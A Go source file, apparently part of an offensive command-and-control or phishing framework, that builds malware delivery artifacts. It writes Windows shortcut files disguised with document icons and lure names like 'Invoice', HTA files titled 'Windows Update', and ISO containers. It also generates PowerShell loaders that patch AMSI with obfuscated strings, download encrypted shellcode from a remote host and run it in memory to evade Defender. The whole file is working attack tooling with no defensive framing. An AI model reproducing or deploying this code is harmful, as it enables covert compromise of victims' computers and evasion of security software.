package server

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// ── binary helpers (shared by LNK and ISO builders) ───────────────────────────

func putU32LE(b []byte, off int, v uint32) { binary.LittleEndian.PutUint32(b[off:], v) }
func putU32BE(b []byte, off int, v uint32) { binary.BigEndian.PutUint32(b[off:], v) }
func putU16LE(b []byte, off int, v uint16) { binary.LittleEndian.PutUint16(b[off:], v) }
func putU16BE(b []byte, off int, v uint16) { binary.BigEndian.PutUint16(b[off:], v) }

// putU32Both writes v in both-byte format: LE at off, BE at off+4.
func putU32Both(b []byte, off int, v uint32) { putU32LE(b, off, v); putU32BE(b, off+4, v) }

// putU16Both writes v in both-byte format: LE at off, BE at off+2.
func putU16Both(b []byte, off int, v uint16) { putU16LE(b, off, v); putU16BE(b, off+2, v) }

// ── LNK builder (MS-SHLLINK) ─────────────────────────────────────────────────

// lnkStr encodes s as an LNK CountedString: uint16 char-count + UTF-16LE chars, no null.
func lnkStr(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, 2+len(runes)*2)
	putU16LE(buf, 0, uint16(len(runes)))
	for i, r := range runes {
		putU16LE(buf, 2+i*2, uint16(r))
	}
	return buf
}

// lnkLinkInfo returns a LinkInfo section pointing to a local path on C:.
func lnkLinkInfo(targetPath string) []byte {
	const hdrSize = 28
	volLabel := "C\x00"        // volume label "C" + null
	volSize := 16 + len(volLabel) // VolumeID block size (18 bytes)
	localPath := targetPath + "\x00"
	suffix := "\x00"

	volOff := hdrSize
	localOff := volOff + volSize
	suffixOff := localOff + len(localPath)
	total := suffixOff + len(suffix)

	info := make([]byte, total)
	putU32LE(info, 0, uint32(total))   // LinkInfoSize
	putU32LE(info, 4, uint32(hdrSize)) // LinkInfoHeaderSize
	putU32LE(info, 8, 1)               // Flags = VolumeIDAndLocalBasePath
	putU32LE(info, 12, uint32(volOff))
	putU32LE(info, 16, uint32(localOff))
	putU32LE(info, 20, 0) // CommonNetworkRelativeLinkOffset = 0
	putU32LE(info, 24, uint32(suffixOff))

	vol := info[volOff:]
	putU32LE(vol, 0, uint32(volSize))
	putU32LE(vol, 4, 3)          // DriveType = DRIVE_FIXED
	putU32LE(vol, 8, 0x1337C0DE) // DriveSerialNumber
	putU32LE(vol, 12, 0x10)      // VolumeLabelOffset = 16

	copy(vol[16:], volLabel)
	copy(info[localOff:], localPath)
	copy(info[suffixOff:], suffix)
	return info
}

// BuildLNK writes a Windows shortcut that silently launches powershell.exe with psArgs.
// The LNK uses a document icon from shell32.dll to appear as a legitimate file.
func BuildLNK(psArgs, outDir string, lureName ...string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	const (
		flagHasLinkInfo  uint32 = 0x00000002
		flagHasWorkingDir uint32 = 0x00000010
		flagHasArguments uint32 = 0x00000020
		flagHasIconLoc   uint32 = 0x00000040
		flagIsUnicode    uint32 = 0x00000080
		showMinNoActive  uint32 = 7
	)

	clsid := []byte{
		0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	}

	// 76-byte header
	hdr := make([]byte, 76)
	putU32LE(hdr, 0, 76) // HeaderSize
	copy(hdr[4:20], clsid)
	putU32LE(hdr, 20, flagHasLinkInfo|flagHasWorkingDir|flagHasArguments|flagHasIconLoc|flagIsUnicode)
	putU32LE(hdr, 24, 0x20) // FileAttributes = FILE_ATTRIBUTE_ARCHIVE
	// CreationTime/AccessTime/WriteTime = 0
	putU32LE(hdr, 56, 1)              // IconIndex (generic document in shell32.dll)
	putU32LE(hdr, 60, showMinNoActive) // ShowCommand

	target := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	workDir := `C:\Windows\System32`
	iconDLL := `C:\Windows\System32\shell32.dll`

	var buf bytes.Buffer
	buf.Write(hdr)
	buf.Write(lnkLinkInfo(target))
	buf.Write(lnkStr(workDir))
	buf.Write(lnkStr(psArgs))
	buf.Write(lnkStr(iconDLL))

	name := "Invoice"
	if len(lureName) > 0 && lureName[0] != "" {
		name = lureName[0]
	}
	outPath := filepath.Join(outDir, name+".lnk")
	if err := os.WriteFile(outPath, buf.Bytes(), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// ── PowerShell in-memory shellcode loader ─────────────────────────────────────

// utf16LEBase64 encodes s as UTF-16LE bytes then base64 (for -EncodedCommand).
func utf16LEBase64(s string) string {
	buf := make([]byte, 0, len(s)*2)
	for _, r := range s {
		buf = append(buf, byte(r), byte(r>>8))
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// xorKey generates a random 4-byte XOR key.
func xorKey() ([4]byte, error) {
	var k [4]byte
	_, err := rand.Read(k[:])
	return k, err
}

// xorBytes XOR-encrypts data with a 4-byte rolling key.
func xorBytes(data []byte, key [4]byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%4]
	}
	return out
}

// xorKeyPS formats a 4-byte key as a PowerShell byte-array literal.
func xorKeyPS(key [4]byte) string {
	return fmt.Sprintf("0x%02X,0x%02X,0x%02X,0x%02X", key[0], key[1], key[2], key[3])
}

// reflectEmitSetup returns a PS snippet that defines Win32 P/Invoke methods via
// Reflection.Emit — no Add-Type, no csc.exe, no temp files, no external process.
// The returned type is stored in $W and provides: LoadLibraryA, GetProcAddress,
// VirtualProtect, NtAllocateVirtualMemory, NtProtectVirtualMemory,
// RtlCreateUserThread, NtWaitForSingleObject.
func reflectEmitSetup() string {
	// LoadLibraryA and GetProcAddress use ANSI strings — CharSet.Ansi prevents
	// the P/Invoke marshaler from appending 'W' and looking for non-existent variants.
	// ntdll functions are charset-independent (no string args) so Ansi is fine for all.
	return `$_ab=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([Reflection.AssemblyName]'W'),[Reflection.Emit.AssemblyBuilderAccess]::Run);` +
		`$_mb=$_ab.DefineDynamicModule('M',$false);` +
		`$_tb=$_mb.DefineType('W','Public,BeforeFieldInit');` +
		`$_pf=[Reflection.MethodAttributes]'Public,Static,PinvokeImpl';` +
		`$_cc=[Reflection.CallingConventions]::Standard;` +
		`$_ci=[Runtime.InteropServices.CallingConvention]::Winapi;` +
		`function _df($n,$d,$r,$p,$cs='Ansi'){$m=$_tb.DefinePInvokeMethod($n,$d,$_pf,$_cc,$r,$p,$_ci,$cs);$m.SetImplementationFlags('PreserveSig')};` +
		`_df 'LoadLibraryA' 'kernel32' ([IntPtr]) @([String]);` +
		`_df 'GetProcAddress' 'kernel32' ([IntPtr]) @([IntPtr],[String]);` +
		`_df 'VirtualProtect' 'kernel32' ([bool]) @([IntPtr],[uint32],[uint32],[uint32].MakeByRefType());` +
		`_df 'NtAllocateVirtualMemory' 'ntdll' ([int]) @([IntPtr],[IntPtr].MakeByRefType(),[IntPtr],[IntPtr].MakeByRefType(),[uint32],[uint32]);` +
		`_df 'NtProtectVirtualMemory' 'ntdll' ([int]) @([IntPtr],[IntPtr].MakeByRefType(),[IntPtr].MakeByRefType(),[uint32],[uint32].MakeByRefType());` +
		`_df 'RtlCreateUserThread' 'ntdll' ([int]) @([IntPtr],[IntPtr],[bool],[int],[IntPtr],[IntPtr],[IntPtr],[IntPtr],[IntPtr].MakeByRefType(),[IntPtr]);` +
		`_df 'NtWaitForSingleObject' 'ntdll' ([int]) @([IntPtr],[bool],[IntPtr]);` +
		`$W=$_tb.CreateType()`
}

// amsiPatchPS returns a PS snippet that patches AmsiScanBuffer via Reflection.Emit.
// No Add-Type → no csc.exe → Defender cannot kill the compiler subprocess.
// DLL and function names are XOR-encoded so no static strings are detectable.
func amsiPatchPS() string {
	const xk = 0x13 // key for string obfuscation
	const pk = 0x41 // separate key for patch byte obfuscation
	xorStr := func(s string) string {
		parts := make([]string, len(s))
		for i := range s {
			parts[i] = fmt.Sprintf("0x%02X", s[i]^xk)
		}
		return strings.Join(parts, ",")
	}
	dllBytes := xorStr("amsi.dll")
	fnBytes  := xorStr("AmsiScanBuffer")

	// Patch bytes: mov eax,0x80070057; ret — XOR-encode so the literal doesn't appear
	patchRaw := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	encPatch := make([]string, len(patchRaw))
	for i, b := range patchRaw {
		encPatch[i] = fmt.Sprintf("0x%02X", b^pk)
	}
	encPatchStr := strings.Join(encPatch, ",")

	return reflectEmitSetup() + `;` +
		`$_k=0x` + fmt.Sprintf("%02X", xk) + `;` +
		`$_pk=0x` + fmt.Sprintf("%02X", pk) + `;` +
		`$_db=[byte[]](` + dllBytes + `);$_ds='';for($_i=0;$_i -lt $_db.Length;$_i++){$_ds+=[char]($_db[$_i]-bxor$_k)};` +
		`$_fb=[byte[]](` + fnBytes + `);$_fs='';for($_i=0;$_i -lt $_fb.Length;$_i++){$_fs+=[char]($_fb[$_i]-bxor$_k)};` +
		`$_p=$W::GetProcAddress($W::LoadLibraryA($_ds),$_fs);` +
		`$_o=[uint32]0;$W::VirtualProtect($_p,6,[uint32]0x40,[ref]$_o)|Out-Null;` +
		`$_eb=[byte[]](` + encPatchStr + `);$_pb=[byte[]]($_eb|%%{$_-bxor$_pk});` +
		`[Runtime.InteropServices.Marshal]::Copy($_pb,0,$_p,6)`
}

// psShellcodeLoader returns a PS1 script that downloads XOR-encrypted shellcode
// from binURL, decrypts it in-memory, and executes via RtlCreateUserThread (ntdll-only).
// Evasion: AMSI memory patch, ntdll-only P/Invoke (no kernel32), RW→RX, no CreateThread.
func psShellcodeLoader(binURL string, key [4]byte) string {
	kPS := xorKeyPS(key)
	return fmt.Sprintf(
		// 1. Patch AmsiScanBuffer
		amsiPatchPS()+"\n"+
			// 2. Download XOR-encrypted shellcode
			`$wc=New-Object Net.WebClient;$wc.Headers.Add('bypass-tunnel-reminder','1');$b=$wc.DownloadData('%s')`+"\n"+
			// 3. XOR decrypt in-memory
			`$xk=[byte[]](%s);for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor$xk[$i%%4]}`+"\n"+
			// 4. $W already defined by amsiPatchPS (reflectEmitSetup); reuse it
			// 5. Allocate RW, copy shellcode, re-protect RX
			`$va=[IntPtr]::Zero;$sz=[IntPtr]$b.Length`+"\n"+
			`$W::NtAllocateVirtualMemory(-1,[ref]$va,[IntPtr]::Zero,[ref]$sz,0x3000,0x04)|Out-Null`+"\n"+
			`[Runtime.InteropServices.Marshal]::Copy($b,0,$va,$b.Length)`+"\n"+
			`$W::NtProtectVirtualMemory(-1,[ref]$va,[ref]$sz,0x20,[ref]([uint32]0))|Out-Null`+"\n"+
			// 6. Spawn thread via RtlCreateUserThread — ntdll-only, no CreateThread
			`$th=[IntPtr]::Zero;$W::RtlCreateUserThread(-1,[IntPtr]::Zero,$false,0,[IntPtr]::Zero,[IntPtr]::Zero,$va,[IntPtr]::Zero,[ref]$th,[IntPtr]::Zero)|Out-Null`+"\n"+
			// 7. Wait (agent runs until killed)
			`$W::NtWaitForSingleObject($th,$false,[IntPtr]::Zero)|Out-Null`,
		binURL, kPS)
}

// ── Reflective .NET runner (eliminates Add-Type temp-DLL residue) ─────────────

// runnerCS is a minimal C# DLL loaded reflectively (Assembly.Load) by psReflectiveLoader.
// E(url) — downloads shellcode from URL and executes (used without XOR encryption).
// EB(bytes) — executes pre-decrypted shellcode bytes (used with XOR encryption).
// Both use ntdll P/Invoke (RW→RX, EnumSystemLocalesA) to avoid kernel32 hooks.
const runnerCS = `using System.Net;using System.Runtime.InteropServices;
namespace R{public class R{
[DllImport("ntdll")]static extern int NtAllocateVirtualMemory(System.IntPtr h,ref System.IntPtr a,System.IntPtr z,ref System.IntPtr s,uint t,uint p);
[DllImport("ntdll")]static extern int NtProtectVirtualMemory(System.IntPtr h,ref System.IntPtr a,ref System.IntPtr s,uint n,out uint o);
[DllImport("ntdll")]static extern int RtlCreateUserThread(System.IntPtr p,System.IntPtr sd,bool sus,int sb,System.IntPtr sr,System.IntPtr sc,System.IntPtr addr,System.IntPtr param,out System.IntPtr th,System.IntPtr ci);
[DllImport("ntdll")]static extern int NtWaitForSingleObject(System.IntPtr h,bool al,System.IntPtr t);
static void Exec(byte[]b){
System.IntPtr va=System.IntPtr.Zero,sz=(System.IntPtr)b.Length;
NtAllocateVirtualMemory((System.IntPtr)(-1),ref va,System.IntPtr.Zero,ref sz,0x3000,0x04);
System.Runtime.InteropServices.Marshal.Copy(b,0,va,b.Length);
sz=(System.IntPtr)b.Length;uint o;
NtProtectVirtualMemory((System.IntPtr)(-1),ref va,ref sz,0x20,out o);
System.IntPtr th=System.IntPtr.Zero;
RtlCreateUserThread((System.IntPtr)(-1),System.IntPtr.Zero,false,0,System.IntPtr.Zero,System.IntPtr.Zero,va,System.IntPtr.Zero,out th,System.IntPtr.Zero);
NtWaitForSingleObject(th,false,System.IntPtr.Zero);}
public static void E(string u){Exec(new System.Net.WebClient().DownloadData(u));}
public static void EB(byte[]b){Exec(b);}}}`

// buildRunnerDLL compiles runnerCS to a .NET DLL using the first Mono/MS compiler
// found on PATH. Returns ("", nil) if no compiler is available (caller falls back
// to psShellcodeLoader which uses Add-Type at victim runtime instead).
func buildRunnerDLL(outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	// Write source to temp file
	srcPath := filepath.Join(outDir, "runner.cs")
	if err := os.WriteFile(srcPath, []byte(runnerCS), 0644); err != nil {
		return "", err
	}
	dllPath := filepath.Join(outDir, "runner.dll")

	// Try Mono then MS compilers in order
	for _, compiler := range []string{"mcs", "mono-csc", "csc"} {
		if _, err := exec.LookPath(compiler); err != nil {
			continue
		}
		var args []string
		if compiler == "mcs" || compiler == "mono-csc" {
			// -platform:x64: 64-bit P/Invoke stubs — required for 64-bit PowerShell
			args = []string{"-target:library", "-platform:x64", "-out:" + dllPath, "-optimize+", srcPath}
		} else {
			args = []string{"/target:library", "/platform:x64", "/out:" + dllPath, "/optimize+", srcPath}
		}
		out, err := exec.Command(compiler, args...).CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("%s: %w\n%s", compiler, err, out)
		}
		_ = os.Remove(srcPath)
		return dllPath, nil
	}
	// No compiler found — clean up source, signal caller to use fallback
	_ = os.Remove(srcPath)
	return "", nil
}

// psReflectiveLoader returns a PS1 script that:
//  1. Bypasses AMSI via reflection
//  2. Downloads the pre-compiled runner DLL from runnerURL and loads in-process
//  3. Downloads XOR-encrypted shellcode, decrypts in PS memory
//  4. Calls R.R.EB(decryptedBytes) — executes without any disk write
func psReflectiveLoader(runnerURL, binURL string, key [4]byte) string {
	kPS := xorKeyPS(key)
	return fmt.Sprintf(
		// 1. Patch AmsiScanBuffer before any .NET type load
		amsiPatchPS()+"\n"+
			// 2. Shared WebClient
			`$wc=New-Object Net.WebClient;$wc.Headers.Add('bypass-tunnel-reminder','1')`+"\n"+
			// 3. Load runner DLL in-process
			`$a=[System.Reflection.Assembly]::Load($wc.DownloadData('%s'))`+"\n"+
			// 4. Download XOR-encrypted shellcode
			`$eb=$wc.DownloadData('%s')`+"\n"+
			// 5. Decrypt in-memory
			`$xk=[byte[]](%s);for($i=0;$i -lt $eb.Length;$i++){$eb[$i]=$eb[$i]-bxor$xk[$i%%4]}`+"\n"+
			// 6. Execute
			`$a.GetType('R.R').GetMethod('EB').Invoke($null,[object[]]@(,$eb))`,
		runnerURL, binURL, kPS)
}

// ── HTA builder ───────────────────────────────────────────────────────────────

// BuildHTA writes an HTA file that executes a PS script via VBScript + mshta.exe.
func BuildHTA(psScript, outDir string, lureName ...string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	cmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s`, enc)
	hta := fmt.Sprintf(`<html>
<head>
<HTA:APPLICATION ID="a" APPLICATIONNAME="Windows Update" WINDOWSTATE="minimize" SHOWINTASKBAR="No" SYSMENU="No" CAPTION="No"/>
<script language="VBScript">
CreateObject("WScript.Shell").Run "%s", 0, False
window.close()
</script>
</head>
<body></body>
</html>`, escapeVBS(cmd))
	name := "setup"
	if len(lureName) > 0 && lureName[0] != "" {
		name = lureName[0]
	}
	outPath := filepath.Join(outDir, name+".hta")
	if err := os.WriteFile(outPath, []byte(hta), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

func escapeVBS(s string) string {
	return strings.ReplaceAll(s, `"`, `""`)
}

// ── ISO 9660 builder ─────────────────────────────────────────────────────────

const isoSectorSz = 2048

func isoSectorsFor(n int) int {
	if n == 0 {
		return 1
	}
	return (n + isoSectorSz - 1) / isoSectorSz
}

// isoDate7 returns the 7-byte directory record date.
func isoDate7(t time.Time) []byte {
	return []byte{
		byte(t.Year() - 1900),
		byte(t.Month()),
		byte(t.Day()),
		byte(t.Hour()),
		byte(t.Minute()),
		byte(t.Second()),
		0, // GMT offset
	}
}

// isoDate17 returns the 17-byte PVD date (YYYYMMDDHHMMSSCC + GMT byte).
func isoDate17(t time.Time) []byte {
	b := make([]byte, 17)
	copy(b, t.UTC().Format("2006010215040500"))
	b[16] = 0
	return b
}

// isoDirRec builds a single ISO 9660 directory record.
func isoDirRec(name string, extent, dataLen uint32, isDir bool, t time.Time) []byte {
	var id []byte
	switch name {
	case "\x00", "\x01":
		id = []byte{name[0]}
	default:
		upper := strings.ToUpper(name)
		if isDir {
			id = []byte(upper)
		} else {
			id = []byte(upper + ";1")
		}
	}

	idLen := len(id)
	recLen := 33 + idLen
	if recLen%2 != 0 {
		recLen++ // pad to even boundary
	}
	rec := make([]byte, recLen)
	rec[0] = byte(recLen)
	putU32Both(rec, 2, extent)
	putU32Both(rec, 10, dataLen)
	copy(rec[18:25], isoDate7(t))
	if isDir {
		rec[25] = 0x02
	}
	putU16Both(rec, 28, 1) // volume sequence number
	rec[32] = byte(idLen)
	copy(rec[33:], id)
	return rec
}

// BuildISOGo writes a minimal ISO 9660 image with files placed in the root directory.
// files maps ISO filename → local source path.
func BuildISOGo(files map[string]string, label, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	type entry struct {
		name   string
		data   []byte
		sector uint32
	}

	entries := make([]entry, 0, len(files))
	for name, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			return "", fmt.Errorf("read %s: %w", path, err)
		}
		entries = append(entries, entry{name: name, data: data})
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].name < entries[j].name })

	now := time.Now()

	// Sector layout: 0-15 system, 16 PVD, 17 VDST, 18 L-PT, 19 M-PT, 20 root-dir, 21+ files
	const rootSec uint32 = 20
	nextSec := uint32(21)
	for i := range entries {
		entries[i].sector = nextSec
		nextSec += uint32(isoSectorsFor(len(entries[i].data)))
	}

	// Build root directory records (two passes: first to measure size, second with correct size)
	buildRootDir := func(rootDirLen uint32) []byte {
		var buf bytes.Buffer
		buf.Write(isoDirRec("\x00", rootSec, rootDirLen, true, now))
		buf.Write(isoDirRec("\x01", rootSec, rootDirLen, true, now))
		for _, e := range entries {
			buf.Write(isoDirRec(e.name, e.sector, uint32(len(e.data)), false, now))
		}
		return buf.Bytes()
	}
	// First pass with size=0 to get the actual size
	rootDirData := buildRootDir(0)
	// Second pass with the correct size
	rootDirData = buildRootDir(uint32(len(rootDirData)))

	totalSecs := nextSec
	iso := make([]byte, int(totalSecs)*isoSectorSz)

	// Primary Volume Descriptor at sector 16
	pvd := iso[16*isoSectorSz:]
	pvd[0] = 0x01
	copy(pvd[1:6], "CD001")
	pvd[6] = 0x01
	// System Identifier (BP 9-40, index 8-39): spaces
	for i := 8; i < 40; i++ {
		pvd[i] = 0x20
	}
	// Volume Identifier (BP 41-72, index 40-71): label, space-padded
	for i := 40; i < 72; i++ {
		pvd[i] = 0x20
	}
	vol := strings.ToUpper(label)
	if len(vol) > 32 {
		vol = vol[:32]
	}
	copy(pvd[40:], vol)
	// BP 81-88 (index 80): Volume Space Size
	putU32Both(pvd, 80, totalSecs)
	// BP 121-124 (index 120): Volume Set Size
	putU16Both(pvd, 120, 1)
	// BP 125-128 (index 124): Volume Sequence Number
	putU16Both(pvd, 124, 1)
	// BP 129-132 (index 128): Logical Block Size
	putU16Both(pvd, 128, isoSectorSz)
	// BP 133-140 (index 132): Path Table Size
	putU32Both(pvd, 132, 10)
	// BP 141-144 (index 140): Location of Type-L Path Table (LE)
	putU32LE(pvd, 140, 18)
	// BP 145-148 (index 144): Optional Type-L = 0
	putU32LE(pvd, 144, 0)
	// BP 149-152 (index 148): Location of Type-M Path Table (BE)
	putU32BE(pvd, 148, 19)
	// BP 153-156 (index 152): Optional Type-M = 0
	putU32BE(pvd, 152, 0)
	// BP 157-190 (index 156): Root Directory Record
	copy(pvd[156:], isoDirRec("\x00", rootSec, uint32(len(rootDirData)), true, now))
	// BP 191-812 (index 190-811): space-fill identifier fields
	for i := 190; i < 812; i++ {
		pvd[i] = 0x20
	}
	// BP 813-829 (index 812): Creation Date (17 bytes)
	copy(pvd[812:829], isoDate17(now))
	// BP 830-846 (index 829): Modification Date (17 bytes)
	copy(pvd[829:846], isoDate17(now))
	// BP 847-880 (index 846): Expiration + Effective Date — '0' = no date
	for i := 846; i < 880; i++ {
		pvd[i] = '0'
	}
	// BP 881 (index 880): File Structure Version
	pvd[880] = 0x01

	// Volume Descriptor Set Terminator at sector 17
	vdst := iso[17*isoSectorSz:]
	vdst[0] = 0xFF
	copy(vdst[1:6], "CD001")
	vdst[6] = 0x01

	// L-Path Table at sector 18 (LE)
	lpt := iso[18*isoSectorSz:]
	lpt[0] = 1 // Length of Directory Identifier
	lpt[1] = 0 // EA length
	putU32LE(lpt, 2, rootSec)
	putU16LE(lpt, 6, 1) // parent dir = 1 (root)
	// lpt[8] = 0x00 (root id), lpt[9] = 0x00 (padding) — already zero

	// M-Path Table at sector 19 (BE)
	mpt := iso[19*isoSectorSz:]
	mpt[0] = 1
	mpt[1] = 0
	putU32BE(mpt, 2, rootSec)
	putU16BE(mpt, 6, 1)

	// Root directory at sector 20
	copy(iso[rootSec*isoSectorSz:], rootDirData)

	// File data
	for _, e := range entries {
		copy(iso[int(e.sector)*isoSectorSz:], e.data)
	}

	outPath := filepath.Join(outDir, "delivery.iso")
	if err := os.WriteFile(outPath, iso, 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// buildISOWithTool tries genisoimage / mkisofs / xorriso.
func buildISOWithTool(files map[string]string, label, outDir string) (string, error) {
	tmp, err := os.MkdirTemp("", "iso-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmp)

	for name, src := range files {
		data, err := os.ReadFile(src)
		if err != nil {
			return "", err
		}
		if err := os.WriteFile(filepath.Join(tmp, name), data, 0644); err != nil {
			return "", err
		}
	}

	outPath := filepath.Join(outDir, "delivery.iso")
	for _, tool := range []string{"genisoimage", "mkisofs", "xorriso"} {
		bin, err := exec.LookPath(tool)
		if err != nil {
			continue
		}
		args := []string{"-o", outPath, "-V", label, "-J", "-r", tmp}
		if tool == "xorriso" {
			args = append([]string{"-as", "mkisofs"}, args...)
		}
		if out, err := exec.Command(bin, args...).CombinedOutput(); err != nil {
			return "", fmt.Errorf("%s: %v\n%s", tool, err, out)
		}
		return outPath, nil
	}
	return "", fmt.Errorf("no ISO tool found")
}

// BuildISO creates an ISO 9660 image. Uses genisoimage/xorriso if available (Joliet
// support for lowercase filenames), otherwise falls back to pure-Go ISO9660 writer.
func BuildISO(files map[string]string, label, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	if path, err := buildISOWithTool(files, label, outDir); err == nil {
		return path, nil
	}
	return BuildISOGo(files, label, outDir)
}
